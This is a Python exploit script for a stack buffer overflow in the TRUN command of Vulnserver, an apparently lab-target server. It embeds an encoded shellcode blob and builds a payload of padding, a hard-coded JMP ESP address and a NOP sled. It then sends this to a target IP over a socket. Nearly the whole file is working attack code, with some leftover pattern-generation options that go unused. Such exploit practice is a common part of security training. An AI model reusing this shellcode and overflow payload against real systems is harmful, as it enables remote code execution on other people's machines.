import argparse
import socket
import struct
import sys

from Tools.pattern.config import PatternConfig
from Tools.pattern.generator import PatternGenerator

shellcode = b""
shellcode += b"\xda\xc6\xd9\x74\x24\xf4\xba\x98\x9f\x36\x43"
shellcode += b"\x5f\x33\xc9\xb1\x52\x31\x57\x17\x83\xef\xfc"
shellcode += b"\x03\xcf\x8c\xd4\xb6\x13\x5a\x9a\x39\xeb\x9b"
shellcode += b"\xfb\xb0\x0e\xaa\x3b\xa6\x5b\x9d\x8b\xac\x09"
shellcode += b"\x12\x67\xe0\xb9\xa1\x05\x2d\xce\x02\xa3\x0b"
shellcode += b"\xe1\x93\x98\x68\x60\x10\xe3\xbc\x42\x29\x2c"
shellcode += b"\xb1\x83\x6e\x51\x38\xd1\x27\x1d\xef\xc5\x4c"
shellcode += b"\x6b\x2c\x6e\x1e\x7d\x34\x93\xd7\x7c\x15\x02"
shellcode += b"\x63\x27\xb5\xa5\xa0\x53\xfc\xbd\xa5\x5e\xb6"
shellcode += b"\x36\x1d\x14\x49\x9e\x6f\xd5\xe6\xdf\x5f\x24"
shellcode += b"\xf6\x18\x67\xd7\x8d\x50\x9b\x6a\x96\xa7\xe1"
shellcode += b"\xb0\x13\x33\x41\x32\x83\x9f\x73\x97\x52\x54"
shellcode += b"\x7f\x5c\x10\x32\x9c\x63\xf5\x49\x98\xe8\xf8"
shellcode += b"\x9d\x28\xaa\xde\x39\x70\x68\x7e\x18\xdc\xdf"
shellcode += b"\x7f\x7a\xbf\x80\x25\xf1\x52\xd4\x57\x58\x3b"
shellcode += b"\x19\x5a\x62\xbb\x35\xed\x11\x89\x9a\x45\xbd"
shellcode += b"\xa1\x53\x40\x3a\xc5\x49\x34\xd4\x38\x72\x45"
shellcode += b"\xfd\xfe\x26\x15\x95\xd7\x46\xfe\x65\xd7\x92"
shellcode += b"\x51\x35\x77\x4d\x12\xe5\x37\x3d\xfa\xef\xb7"
shellcode += b"\x62\x1a\x10\x12\x0b\xb1\xeb\xf5\xf4\xee\xf2"
shellcode += b"\x69\x9d\xec\xf4\x52\x74\x78\x12\xfe\x96\x2c"
shellcode += b"\x8d\x97\x0f\x75\x45\x09\xcf\xa3\x20\x09\x5b"
shellcode += b"\x40\xd5\xc4\xac\x2d\xc5\xb1\x5c\x78\xb7\x14"
shellcode += b"\x62\x56\xdf\xfb\xf1\x3d\x1f\x75\xea\xe9\x48"
shellcode += b"\xd2\xdc\xe3\x1c\xce\x47\x5a\x02\x13\x11\xa5"
shellcode += b"\x86\xc8\xe2\x28\x07\x9c\x5f\x0f\x17\x58\x5f"
shellcode += b"\x0b\x43\x34\x36\xc5\x3d\xf2\xe0\xa7\x97\xac"
shellcode += b"\x5f\x6e\x7f\x28\xac\xb1\xf9\x35\xf9\x47\xe5"
shellcode += b"\x84\x54\x1e\x1a\x28\x31\x96\x63\x54\xa1\x59"
shellcode += b"\xbe\xdc\xc1\xbb\x6a\x29\x6a\x62\xff\x90\xf7"
shellcode += b"\x95\x2a\xd6\x01\x16\xde\xa7\xf5\x06\xab\xa2"
shellcode += b"\xb2\x80\x40\xdf\xab\x64\x66\x4c\xcb\xac"


def parse_args():
    parser = argparse.ArgumentParser(description="Vulnserver TRUN Exploit.")

    # --- Target options ---
    target_group = parser.add_argument_group("Target options")
    target_group.add_argument(
        "--target-ip", type=str, required=True, help="Target server IP address"
    )
    target_group.add_argument(
        "--target-port",
        type=int,
        default=80,
        help="Target web frontend port (default: 80)",
    )

    parser.add_argument(
        "-l",
        "--length",
        type=int,
        required=True,
        help="Length of the pattern to generate",
    )

    parser.add_argument(
        "--arch",
        choices=["x86", "x64"],
        default="x86",
        help="Architecture (default: x86)",
    )

    parser.add_argument(
        "--word-size",
        type=int,
        choices=[4, 8],
        help="Override word size (4 or 8 bytes)",
    )

    parser.add_argument(
        "--endianness",
        choices=["little", "big"],
        default="little",
        help="Endianness (kept for symmetry; does not affect generation)",
    )

    parser.add_argument(
        "--hex",
        action="store_true",
        help="Output pattern as hex instead of ASCII",
    )

    parser.add_argument(
        "--newline",
        action="store_true",
        help="Append a newline to the output",
    )

    return parser.parse_args()


def main():
    args = parse_args()

    # Resolve word size
    if args.word_size is not None:
        word_size = args.word_size
    else:
        word_size = 4 if args.arch == "x86" else 8

    try:
        config = PatternConfig(
            word_size=word_size,
            endianness=args.endianness,
        )

        pattern_gen = PatternGenerator(config)
        pattern = pattern_gen.create(args.length)

    except Exception as exc:
        print(f"[-] Error: {exc}", file=sys.stderr)
        return 1

    jmp_esp = struct.pack("<I", 0x625011AF)

    # payload = "TRUN /.:/" + pattern.decode() + "\r\n"
    payload = b"TRUN /.:/" + b"A" * 2003 + jmp_esp + b"\x90" * 32 + shellcode
    print(payload[2003 : 2003 + 40].hex())
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((args.target_ip, args.target_port))
        s.sendall(payload)


if __name__ == "__main__":
    main()
